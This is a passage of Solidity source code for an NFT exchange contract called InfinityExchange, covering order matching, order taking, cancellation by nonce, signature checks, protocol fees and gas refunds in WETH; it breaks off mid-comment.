NFTNFT\nNFTNFTNFT...........................................NFTNFTNFT \n\n*/\ncontract InfinityExchange is ReentrancyGuard, Ownable {\n  using SafeERC20 for IERC20;\n  using EnumerableSet for EnumerableSet.AddressSet;\n\n  /// @dev WETH address of a chain; set at deploy time to the WETH address of the chain that this contract is deployed to\n  address public immutable WETH;\n  /// @dev Used in order signing with EIP-712\n  bytes32 public immutable DOMAIN_SEPARATOR;\n  /// @dev This is the adress that is used to send auto sniped orders for execution on chain\n  address public MATCH_EXECUTOR;\n  /// @dev Gas cost for auto sniped orders are paid by the buyers and refunded to this contract in the form of WETH\n  uint32 public WETH_TRANSFER_GAS_UNITS = 50000;\n  /// @notice Exchange fee in basis points (250 bps = 2.5%)\n  uint16 public PROTOCOL_FEE_BPS = 250;\n\n  /**\n   @dev All orders should have a nonce >= to this value. \n        Any orders with nonce value less than this are non-executable. \n        Used for cancelling all outstanding orders.\n  */\n  mapping(address => uint256) public userMinOrderNonce;\n\n  /// @dev This records already executed or cancelled orders to prevent replay attacks.\n  mapping(address => mapping(uint256 => bool)) public isUserOrderNonceExecutedOrCancelled;\n\n  /// @dev Storage variable that keeps track of valid complications (order execution strategies)\n  EnumerableSet.AddressSet private _complications;\n  /// @dev Storate variable that keeps track of valid currencies (tokens)\n  EnumerableSet.AddressSet private _currencies;\n\n  event CancelAllOrders(address user, uint256 newMinNonce);\n  event CancelMultipleOrders(address user, uint256[] orderNonces);\n  event NewWethTransferGasUnits(uint32 wethTransferGasUnits);\n  event NewProtocolFee(uint16 protocolFee);\n\n  event MatchOrderFulfilled(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  event TakeOrderFulfilled(\n    bytes32 orderHash,\n    address seller,\n    address buyer,\n    address complication, // address of the complication that defines the execution\n    address currency, // token address of the transacting currency\n    uint256 amount // amount spent on the order\n  );\n\n  constructor(address _WETH, address _matchExecutor) {\n    // Calculate the domain separator\n    DOMAIN_SEPARATOR = keccak256(\n      abi.encode(\n        keccak256('EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)'),\n        keccak256('InfinityExchange'),\n        keccak256(bytes('1')), // for versionId = 1\n        block.chainid,\n        address(this)\n      )\n    );\n    WETH = _WETH;\n    MATCH_EXECUTOR = _matchExecutor;\n  }\n\n  fallback() external payable {}\n\n  receive() external payable {}\n\n  // =================================================== USER FUNCTIONS =======================================================\n\n  /**\n   @notice Matches orders one to one where each order has 1 NFT. Example: Match 1 specific NFT buy with one specific NFT sell.\n   @dev Can execute orders in batches for gas efficiency. Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n   @param makerOrders1 Maker order 1\n   @param makerOrders2 Maker order 2\n  */\n  function matchOneToOneOrders(\n    OrderTypes.MakerOrder[] calldata makerOrders1,\n    OrderTypes.MakerOrder[] calldata makerOrders2\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numMakerOrders = makerOrders1.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numMakerOrders == makerOrders2.length, 'mismatched lengths');\n\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    for (uint256 i = 0; i < numMakerOrders; ) {\n      uint256 startGasPerOrder = gasleft() + ((startGas - gasleft()) / numMakerOrders);\n      require(_complications.contains(makerOrders1[i].execParams[0]), 'invalid complication');\n      (bool canExec, uint256 execPrice) = IComplication(makerOrders1[i].execParams[0]).canExecMatchOneToOne(\n        makerOrders1[i],\n        makerOrders2[i]\n      );\n      require(canExec, 'cannot execute');\n      _matchOneToOneOrders(\n        makerOrders1[i],\n        makerOrders2[i],\n        startGasPerOrder,\n        execPrice,\n        protocolFeeBps,\n        wethTransferGasUnits,\n        weth\n      );\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.\n   @dev Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n   @param makerOrder The one order to match\n   @param manyMakerOrders Array of multiple orders to match the one order against\n  */\n  function matchOneToManyOrders(\n    OrderTypes.MakerOrder calldata makerOrder,\n    OrderTypes.MakerOrder[] calldata manyMakerOrders\n  ) external {\n    uint256 startGas = gasleft();\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');\n    require(\n      IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),\n      'cannot execute'\n    );\n    bytes32 makerOrderHash = _hash(makerOrder);\n    require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');\n    uint256 ordersLength = manyMakerOrders.length;\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    if (makerOrder.isSellOrder) {\n      for (uint256 i = 0; i < ordersLength; ) {\n        // 20000 for the SSTORE op that updates maker nonce status from zero to a non zero status\n        uint256 startGasPerOrder = gasleft() + ((startGas + 20000 - gasleft()) / ordersLength);\n        _matchOneMakerSellToManyMakerBuys(\n          makerOrderHash,\n          makerOrder,\n          manyMakerOrders[i],\n          startGasPerOrder,\n          protocolFeeBps,\n          wethTransferGasUnits,\n          weth\n        );\n        unchecked {\n          ++i;\n        }\n      }\n      isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n    } else {\n      uint256 protocolFee;\n      for (uint256 i = 0; i < ordersLength; ) {\n        protocolFee += _matchOneMakerBuyToManyMakerSells(\n          makerOrderHash,\n          manyMakerOrders[i],\n          makerOrder,\n          protocolFeeBps\n        );\n        unchecked {\n          ++i;\n        }\n      }\n      isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;\n      uint256 gasCost = (startGas - gasleft() + WETH_TRANSFER_GAS_UNITS) * tx.gasprice;\n      // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n      // else we need to send the protocol fee separately in the execution currency\n      // since the buyer is common across many sell orders, this part can be executed outside the above for loop\n      // in contrast to the case where if the one order is a sell order, we need to do this in each for loop\n      if (makerOrder.execParams[1] == weth) {\n        IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), protocolFee + gasCost);\n      } else {\n        IERC20(makerOrder.execParams[1]).safeTransferFrom(makerOrder.signer, address(this), protocolFee);\n        IERC20(weth).safeTransferFrom(makerOrder.signer, address(this), gasCost);\n      }\n    }\n  }\n\n  /**\n   @notice Matches orders one to one where no specific NFTs are specified. \n          Example: A collection wide buy order with any 2 NFTs with a sell order that has any 2 NFTs from that collection.\n   @dev Can only be called by the match executor. Refunds gas cost incurred by the\n        match executor to this contract. Checks whether the given complication can execute the match.\n        The constructs param specifies the actual NFTs that will be executed since buys and sells need not specify actual NFTs - only \n        a higher level intent.\n   @param sells User signed sell orders\n   @param buys User signed buy orders\n   @param constructs Intersection of the NFTs in the sells and buys. Constructed by an off chain matching engine.\n  */\n  function matchOrders(\n    OrderTypes.MakerOrder[] calldata sells,\n    OrderTypes.MakerOrder[] calldata buys,\n    OrderTypes.OrderItem[][] calldata constructs\n  ) external {\n    uint256 startGas = gasleft();\n    uint256 numSells = sells.length;\n    require(msg.sender == MATCH_EXECUTOR, 'OME');\n    require(numSells == buys.length && numSells == constructs.length, 'mismatched lengths');\n    // the below 3 variables are copied to memory once to save on gas\n    // an SLOAD costs minimum 100 gas where an MLOAD only costs minimum 3 gas\n    // since these values won't change during function execution, we can save on gas by copying them to memory once\n    // instead of SLOADing once for each loop iteration\n    uint16 protocolFeeBps = PROTOCOL_FEE_BPS;\n    uint32 wethTransferGasUnits = WETH_TRANSFER_GAS_UNITS;\n    address weth = WETH;\n    for (uint256 i = 0; i < numSells; ) {\n      uint256 startGasPerOrder = gasleft() + ((startGas - gasleft()) / numSells);\n      (bool executionValid, uint256 execPrice) = IComplication(sells[i].execParams[0]).canExecMatchOrder(\n        sells[i],\n        buys[i],\n        constructs[i]\n      );\n      require(executionValid, 'cannot execute');\n      _matchOrders(\n        sells[i],\n        buys[i],\n        constructs[i],\n        startGasPerOrder,\n        execPrice,\n        protocolFeeBps,\n        wethTransferGasUnits,\n        weth\n      );\n      unchecked {\n        ++i;\n      }\n    }\n  }\n\n  /**\n   @notice Batch buys or sells orders with specific `1` NFTs. Transaction initiated by an end user.\n   @param makerOrders The orders to fulfill\n  */\n  function takeMultipleOneOrders(OrderTypes.MakerOrder[] calldata makerOrders) external payable nonReentrant {\n    uint256 numMakerOrders = makerOrders.length;\n    uint256 totalPrice;\n    address currency = makerOrders[0].execParams[1];\n    bool isMakerSeller = makerOrders[0].isSellOrder;\n    if (!isMakerSeller) {\n      require(currency != address(0), 'offers only in ERC20');\n    }\n    for (uint256 i = 0; i < numMakerOrders; ) {\n      bytes32 makerOrderHash = _hash(makerOrders[i]);\n      require(isOrderValid(makerOrders[i], makerOrderHash), 'invalid maker order');\n      bool isTimeValid = makerOrders[i].constraints[3] <= block.timestamp &&\n        makerOrders[i].constraints[4] >= block.timestamp;\n      require(isTimeValid, 'invalid time');\n      require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n      require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n      uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n      totalPrice += execPrice;\n      _execTakeOneOrder(makerOrderHash, makerOrders[i], isMakerSeller, execPrice);\n      unchecked {\n        ++i;\n      }\n    }\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n  }\n\n  /**\n   @notice Batch buys or sells orders where maker orders can have unspecified NFTs. Transaction initiated by an end user.\n   @param makerOrders The orders to fulfill\n   @param takerNfts The specific NFTs that the taker is willing to take that intersect with the higher order intent of the maker\n   Example: If a makerOrder is 'buy any one of these 2 specific NFTs', then the takerNfts would be 'this one specific NFT'.\n  */\n  function takeOrders(OrderTypes.MakerOrder[] calldata makerOrders, OrderTypes.OrderItem[][] calldata takerNfts)\n    external\n    payable\n    nonReentrant\n  {\n    uint256 ordersLength = makerOrders.length;\n    require(ordersLength == takerNfts.length, 'mismatched lengths');\n    uint256 totalPrice;\n    address currency = makerOrders[0].execParams[1];\n    bool isMakerSeller = makerOrders[0].isSellOrder;\n    if (!isMakerSeller) {\n      require(currency != address(0), 'offers only in ERC20');\n    }\n    for (uint256 i = 0; i < ordersLength; ) {\n      require(currency == makerOrders[i].execParams[1], 'cannot mix currencies');\n      require(isMakerSeller == makerOrders[i].isSellOrder, 'cannot mix order sides');\n      uint256 execPrice = _getCurrentPrice(makerOrders[i]);\n      totalPrice += execPrice;\n      _takeOrders(makerOrders[i], takerNfts[i], execPrice);\n      unchecked {\n        ++i;\n      }\n    }\n    // check to ensure that for ETH orders, enough ETH is sent\n    // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent\n    if (isMakerSeller && currency == address(0)) {\n      require(msg.value >= totalPrice, 'invalid total price');\n    }\n  }\n\n  /**\n   @notice Helper function (non exchange related) to send multiple NFTs in one go\n   @param to The orders to fulfill\n   @param items The specific NFTs to transfer\n  */\n  function transferMultipleNFTs(address to, OrderTypes.OrderItem[] calldata items) external nonReentrant {\n    _transferMultipleNFTs(msg.sender, to, items);\n  }\n\n  /**\n   * @notice Cancel all pending orders\n   * @param minNonce minimum user nonce\n   */\n  function cancelAllOrders(uint256 minNonce) external {\n    require(minNonce > userMinOrderNonce[msg.sender], 'nonce too low');\n    require(minNonce < userMinOrderNonce[msg.sender] + 1000000, 'too many');\n    userMinOrderNonce[msg.sender] = minNonce;\n    emit CancelAllOrders(msg.sender, minNonce);\n  }\n\n  /**\n   * @notice Cancel multiple orders\n   * @param orderNonces array of order nonces\n   */\n  function cancelMultipleOrders(uint256[] calldata orderNonces) external {\n    uint256 numNonces = orderNonces.length;\n    require(numNonces > 0, 'cannot be empty');\n    for (uint256 i = 0; i < numNonces; ) {\n      require(orderNonces[i] >= userMinOrderNonce[msg.sender], 'nonce too low');\n      require(!isUserOrderNonceExecutedOrCancelled[msg.sender][orderNonces[i]], 'nonce already executed or cancelled');\n      isUserOrderNonceExecutedOrCancelled[msg.sender][orderNonces[i]] = true;\n      unchecked {\n        ++i;\n      }\n    }\n    emit CancelMultipleOrders(msg.sender, orderNonces);\n  }\n\n  // ====================================================== VIEW FUNCTIONS ======================================================\n\n  /**\n   * @notice Check whether user order nonce is executed or cancelled\n   * @param user address of user\n   * @param nonce nonce of the order\n   * @return whether nonce is valid\n   */\n  function isNonceValid(address user, uint256 nonce) external view returns (bool) {\n    return !isUserOrderNonceExecutedOrCancelled[user][nonce] && nonce > userMinOrderNonce[user];\n  }\n\n  /**\n   * @notice Check whether a user signed order has valid signature\n   * @param order the order to verify\n   * @return whether order has valid signature\n   */\n  function verifyOrderSig(OrderTypes.MakerOrder calldata order) external view returns (bool) {\n    // Verify the validity of the signature\n    (bytes32 r, bytes32 s, uint8 v) = abi.decode(order.sig, (bytes32, bytes32, uint8));\n    return SignatureChecker.verify(_hash(order), order.signer, r, s, v, DOMAIN_SEPARATOR);\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n   * @param sellOrderHash hash of the sell order\n   * @param buyOrderHash hash of the buy order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid\n   */\n  function verifyMatchOneToOneOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      isOrderValid(sell, sellOrderHash) &&\n      isOrderValid(buy, buyOrderHash));\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n   * @param orderHash hash of the order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid\n   */\n  function verifyMatchOneToManyOrders(\n    bytes32 orderHash,\n    bool verifySellOrder,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    bool _orderValid;\n    if (verifySellOrder) {\n      _orderValid = isOrderValid(sell, orderHash);\n    } else {\n      _orderValid = isOrderValid(buy, orderHash);\n    }\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      _orderValid);\n  }\n\n  /**\n   * @notice Checks whether orders are valid\n   * @dev Checks whether currencies match, sides match, complications match and if each order is valid (see isOrderValid)\n          Also checks if the given complication can execute this order\n   * @param sellOrderHash hash of the sell order\n   * @param buyOrderHash hash of the buy order\n   * @param sell the sell order\n   * @param buy the buy order\n   * @return whether orders are valid and the execution price\n   */\n  function verifyMatchOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy\n  ) public view returns (bool) {\n    bool currenciesMatch = sell.execParams[1] == buy.execParams[1] ||\n      (sell.execParams[1] == address(0) && buy.execParams[1] == WETH);\n    return (sell.isSellOrder &&\n      !buy.isSellOrder &&\n      sell.execParams[0] == buy.execParams[0] &&\n      currenciesMatch &&\n      isOrderValid(sell, sellOrderHash) &&\n      isOrderValid(buy, buyOrderHash));\n  }\n\n  /**\n   * @notice Verifies the validity of the order\n   * @dev checks whether order nonce was cancelled or already executed, \n          if signature is valid and if the complication and currency are valid\n   * @param order the order\n   * @param orderHash computed hash of the order\n   */\n  function isOrderValid(OrderTypes.MakerOrder calldata order, bytes32 orderHash) public view returns (bool) {\n    bool orderExpired = isUserOrderNonceExecutedOrCancelled[order.signer][order.constraints[5]] ||\n      order.constraints[5] < userMinOrderNonce[order.signer];\n    // Verify the validity of the signature\n    (bytes32 r, bytes32 s, uint8 v) = abi.decode(order.sig, (bytes32, bytes32, uint8));\n    bool sigValid = SignatureChecker.verify(orderHash, order.signer, r, s, v, DOMAIN_SEPARATOR);\n    if (\n      orderExpired ||\n      !sigValid ||\n      order.signer == address(0) ||\n      !_complications.contains(order.execParams[0]) ||\n      !_currencies.contains(order.execParams[1])\n    ) {\n      return false;\n    }\n    return true;\n  }\n\n  /// @notice returns the number of complications supported by the exchange\n  function numComplications() external view returns (uint256) {\n    return _complications.length();\n  }\n\n  /// @notice returns the complication at the given index\n  function getComplicationAt(uint256 index) external view returns (address) {\n    return _complications.at(index);\n  }\n\n  /// @notice returns whether a given complication is valid\n  function isValidComplication(address complication) external view returns (bool) {\n    return _complications.contains(complication);\n  }\n\n  /// @notice returns the number of currencies supported by the exchange\n  function numCurrencies() external view returns (uint256) {\n    return _currencies.length();\n  }\n\n  /// @notice returns the currency at the given index\n  function getCurrencyAt(uint256 index) external view returns (address) {\n    return _currencies.at(index);\n  }\n\n  /// @notice returns whether a given currency is valid\n  function isValidCurrency(address currency) external view returns (bool) {\n    return _currencies.contains(currency);\n  }\n\n  // ====================================================== INTERNAL FUNCTIONS ================================================\n\n  /**\n   * @notice Internal helper function to match orders one to one\n   * @param makerOrder1 first order\n   * @param makerOrder2 second maker order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOneToOneOrders(\n    OrderTypes.MakerOrder calldata makerOrder1,\n    OrderTypes.MakerOrder calldata makerOrder2,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    OrderTypes.MakerOrder calldata sell = makerOrder1.isSellOrder ? makerOrder1 : makerOrder2;\n    OrderTypes.MakerOrder calldata buy = makerOrder1.isSellOrder ? makerOrder2 : makerOrder1;\n    bytes32 sellOrderHash = _hash(sell);\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOneToOneOrders(sellOrderHash, buyOrderHash, sell, buy), 'order not verified');\n    _execMatchOneToOneOrders(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      startGasPerOrder,\n      execPrice,\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function to match one maker sell order to many maker buys\n   * @param sellOrderHash sell order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOneToManyOrders(buyOrderHash, false, sell, buy), 'order not verified');\n    _execMatchOneMakerSellToManyMakerBuys(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      startGasPerOrder,\n      _getCurrentPrice(buy),\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function to match one maker buy order to many maker sells\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param protocolFeeBps exchange fee\n   */\n  function _matchOneMakerBuyToManyMakerSells(\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint16 protocolFeeBps\n  ) internal returns (uint256) {\n    bytes32 sellOrderHash = _hash(sell);\n    require(verifyMatchOneToManyOrders(sellOrderHash, true, sell, buy), 'order not verified');\n    return\n      _execMatchOneMakerBuyToManyMakerSells(\n        sellOrderHash,\n        buyOrderHash,\n        sell,\n        buy,\n        _getCurrentPrice(sell),\n        protocolFeeBps\n      );\n  }\n\n  /**\n   * @notice Internal helper function to match orders specified via a higher order intent\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param constructedNfts the nfts constructed by an off chain matching that are guaranteed to intersect\n            with the user specified signed intents (orders)\n   * @param startGasPerOrder start gas when this order started execution\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _matchOrders(\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    bytes32 sellOrderHash = _hash(sell);\n    bytes32 buyOrderHash = _hash(buy);\n    require(verifyMatchOrders(sellOrderHash, buyOrderHash, sell, buy), 'order not verified');\n    _execMatchOrders(\n      sellOrderHash,\n      buyOrderHash,\n      sell,\n      buy,\n      constructedNfts,\n      startGasPerOrder,\n      execPrice,\n      protocolFeeBps,\n      wethTransferGasUnits,\n      weth\n    );\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one to one orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Also refunds gas expenditure to the contract\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _execMatchOneToOneOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[sell.signer][sell.constraints[5]] = true;\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _transferMultipleNFTs(sell.signer, buy.signer, sell.nfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, sell.signer, remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one sell to many buy orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Also refunds gas expenditure to the contract\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param startGasPerOrder start gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth WETH address\n   */\n  function _execMatchOneMakerSellToManyMakerBuys(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match one buy to many sell orders\n   * @dev Updates order nonce states, does asset transfers and emits events. Gas expenditure refund is done in the caller\n          since it does not need to be done in a loop\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @return the protocolFee so that the buyer can pay the protocol fee and gas cost in one go\n   */\n  function _execMatchOneMakerBuyToManyMakerSells(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    uint256 execPrice,\n    uint16 protocolFeeBps\n  ) internal returns (uint256) {\n    isUserOrderNonceExecutedOrCancelled[sell.signer][sell.constraints[5]] = true;\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOneToManyOrders(sell.signer, buy.signer, sell.nfts, buy.execParams[1], remainingAmount);\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    return protocolFee;\n  }\n\n  /// @dev this helper purely exists to help reduce contract size a bit and avoid any stack too deep errors\n  function _execMatchOneToManyOrders(\n    address seller,\n    address buyer,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    address currency,\n    uint256 amount\n  ) internal {\n    _transferMultipleNFTs(seller, buyer, constructedNfts);\n    // transfer final amount (post-fees) to seller\n    IERC20(currency).safeTransferFrom(buyer, seller, amount);\n  }\n\n  /**\n   * @notice Internal helper function that executes contract state changes and does asset transfers for match orders\n   * @dev Updates order nonce states, does asset transfers, emits events and does gas refunds\n   * @param sellOrderHash sell order hash\n   * @param buyOrderHash buy order hash\n   * @param sell the sell order\n   * @param buy the buy order\n   * @param constructedNfts the constructed nfts\n   * @param startGasPerOrder gas when this order started execution\n   * @param execPrice execution price\n   * @param protocolFeeBps exchange fee\n   * @param wethTransferGasUnits gas units that a WETH transfer will use\n   * @param weth weth address\n   */\n  function _execMatchOrders(\n    bytes32 sellOrderHash,\n    bytes32 buyOrderHash,\n    OrderTypes.MakerOrder calldata sell,\n    OrderTypes.MakerOrder calldata buy,\n    OrderTypes.OrderItem[] calldata constructedNfts,\n    uint256 startGasPerOrder,\n    uint256 execPrice,\n    uint16 protocolFeeBps,\n    uint32 wethTransferGasUnits,\n    address weth\n  ) internal {\n    uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;\n    uint256 remainingAmount = execPrice - protocolFee;\n    _execMatchOrder(\n      sell.signer,\n      buy.signer,\n      sell.constraints[5],\n      buy.constraints[5],\n      constructedNfts,\n      buy.execParams[1],\n      remainingAmount\n    );\n    _emitMatchEvent(\n      sellOrderHash,\n      buyOrderHash,\n      sell.signer,\n      buy.signer,\n      buy.execParams[0],\n      buy.execParams[1],\n      execPrice\n    );\n    uint256 gasCost = (startGasPerOrder - gasleft() + wethTransferGasUnits) * tx.gasprice;\n    // if the execution currency is weth, we can send the protocol fee and gas cost in one transfer to save gas\n    // else we need to send the protocol fee separately in the execution currency\n    if (buy.execParams[1] == weth) {\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), protocolFee + gasCost);\n    } else {\n      IERC20(buy.execParams[1]).safeTransferFrom(buy.signer, address(this), protocolFee);\n      IERC20(weth).safeTransferFrom(buy.signer, address(this), gasCost);\n    }\n  }\n\n  /// @dev this helper purely exists to 